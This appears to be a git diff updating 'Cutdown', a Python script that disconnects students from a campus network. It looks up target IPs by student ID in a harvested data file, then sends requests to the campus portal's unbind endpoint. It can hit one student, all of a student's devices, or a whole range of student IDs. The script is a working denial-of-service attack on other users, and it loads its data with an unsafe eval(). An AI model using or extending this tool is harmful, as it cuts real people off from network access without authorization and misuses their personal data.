@@ -1,6 +1,7 @@
 import requests
 import time
 import json
+import sys
 
 def int_to_ip(integer_value):
     a = (integer_value >> 24) & 0xFF
@@ -13,54 +14,70 @@ def ip_to_int(ip_address:str):
     a, b, c, d = map(int, ip_address.split('.'))
     return (a << 24) + (b << 16) + (c << 8) + d
 
-def cutdown(**kwargs):
+def cutdown(data:list,**kwargs):
     headers = {
         "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0",
         "Accept-Language": "en-US,en;q=0.5",
         "Accept-Encoding": "gzip, deflate, br",
         "Accept": "*/*",
-        "Referer": "http://192.168.10.154/"
+        "Referer": "http://xx.xx.xx.xx/"
     }
-    for key in kwargs:
-        if key == 'single_ip':
-            r = requests.get(f"http://192.168.10.154:801/eportal/portal/mac/unbind?wlan_user_mac=000000000000&wlan_user_ip={kwargs[key]}", headers=headers)
-            print("[+] Sending Request....")
-            if json.loads(r.text[12:-2])['result'] == 1:
-                time.sleep(2)
-                print(f"[+] The ip Address {kwargs[key]} Now has been shutdown.")
-                print(f"{GREEN}[Info] {r.text}{RESET}")
+    
+    def unbind_ip(ip):
+        r = requests.get(f"http://xx.xx.xx.xx:801/eportal/portal/mac/unbind?wlan_user_mac=000000000000&wlan_user_ip={ip_to_int(ip)}", headers=headers)
+        if r.status_code == 200:
+            response_data = json.loads(r.text[12:-2])
+            if response_data['result'] == 1:
+                print(f"{YELLOW}[+] The IP address {ip} has been shut down.{RESET}\n{response_data}")
             else:
-                print('[*] Oops,got some issues')
-                # print(json.loads(r.text[12:-2])['result'])
-                print("Reponse: " + r.text)
-        elif key == "MIN_STUDENT_ID" or key == "MAX_STUDENT_ID":
-            for i in range(int(kwargs['MIN_STUDENT_ID']), int(kwargs['MAX_STUDENT_ID']) + 1):
-                if not stuid_toip(data,str(i)) == 0:
-                  r = requests.get(f"http://192.168.10.154:801/eportal/portal/mac/unbind?wlan_user_mac=000000000000&wlan_user_ip={ip_to_int(stuid_toip(data, str(i)))}", headers=headers)
-                  print(f"[*] 正在给学号{i},IP为{stuid_toip(data, str(i))} 的哥们断网中...")
-                  if r.status_code == 200:
-                    print('OK.')
-                    print(f"{GREEN}[INFO] {r.text}{RESET}\n")
-                  else:
-                    print(f'{RED}[FAILED] {r.status_code}{RESET}')
+                print(f'{RED}[*] Oops, got some issues: {response_data}{RESET}')
+        else:
+            print(f'{RED}[FAILED] {r.status_code}{RESET}')
+
+    if 'single_id' in kwargs:
+        device_info = query(data, kwargs['single_id'])
+        if not device_info:
+            print(f"{RED}[FAILED] 未找到学号为 {kwargs['single_id']} 人员ip数据.该人员可能未注册校园网{RESET}")
+        else:
+            if len(device_info) > 1:
+                print(f"{YELLOW}[WARNING] 目标拥有多台设备(两个及以上)，是否进行多设备同断操作？{RESET}")
+                option = input('#(y/n):')
+                if option == 'y':
+                    for i, device in enumerate(device_info):
+                        print(f'{GREEN}[INFO] Device {i}: {device["online_ip"]}{RESET}')
+                        unbind_ip(device['online_ip'])
                 else:
-                    continue
+                    print('[*] Exit!')
+                    sys.exit()
+            else:
+                unbind_ip(device_info[0]['online_ip'])
+    elif 'MIN_STUDENT_ID' in kwargs and 'MAX_STUDENT_ID' in kwargs:
+        for i in range(int(kwargs['MIN_STUDENT_ID']), int(kwargs['MAX_STUDENT_ID']) + 1):
+            device_info = query(data, str(i))
+            if not device_info:
+                print(f"{RED}[FAILED] 未找到学号为 {i} 人员ip数据.该人员可能未注册校园网{RESET}")
+                continue
+            for device in device_info:
+                unbind_ip(device['online_ip'])
 
 def stuid_toip(data, stuid):
     for item in data:
         if item['user_account'] == stuid:
             return item['online_ip']
-    else:
-        print(f"{RED}[FAILED] 未找到学号为 {stuid} 人员ip数据.该人员可能未注册校园网{RESET}")
-        return 0
-        
+    return 0
 
 def configuration(filename, data):
     with open(filename, 'r') as file:
         for line in file:
-            # 假设每行数据是JSON格式
             data.append(eval(line.strip()))
     print(f'{GREEN}[+] 已读取{len(data)}行数据{RESET}\n')
+
+def query(datalist:list, student_id:str) -> list:
+    tmp_device = []
+    for item in datalist:
+        if item['user_account'] == student_id:
+            tmp_device.append({'online_ip': item['online_ip']})
+    return tmp_device
 
 def main(data_list):
     data_file = input("请输入数据来源:")
@@ -75,17 +92,17 @@ def main(data_list):
         """
     )
 
-    print(f"{YELLOW}MADE BY E1iminate1337 VERSION:0.1v{RESET}\n")
+    print(f"{YELLOW}MADE BY E1iminate1337 VERSION:0.2v{RESET}\n")
 
     options = input(f"{GREEN}[*]{RESET} Welcome to the Cutdown script:\n1.单个学号断网\n2.范围学号断网\n选择:")
     if options == '1':
         stuID = input("\n[*] 输入单个目标学号:")
         print(f"{GREEN}[+] Target stuID:{stuID}{RESET}")
-        cutdown(single_ip=stuid_toip(data_list, stuID))
+        cutdown(data_list, single_id=stuID)
     elif options == '2':
         min_stuid = input("\nMIN_STUDENT_ID:")
         max_stuid = input("MAX_STUDENT_ID:")
-        cutdown(MAX_STUDENT_ID=max_stuid, MIN_STUDENT_ID=min_stuid)
+        cutdown(data_list, MAX_STUDENT_ID=max_stuid, MIN_STUDENT_ID=min_stuid)
     else:
         print(f"{RED}[FAILED] 请勿输入选项外的数字或内容{RESET}+\n{RED}[*] Exit!{RESET}")
 
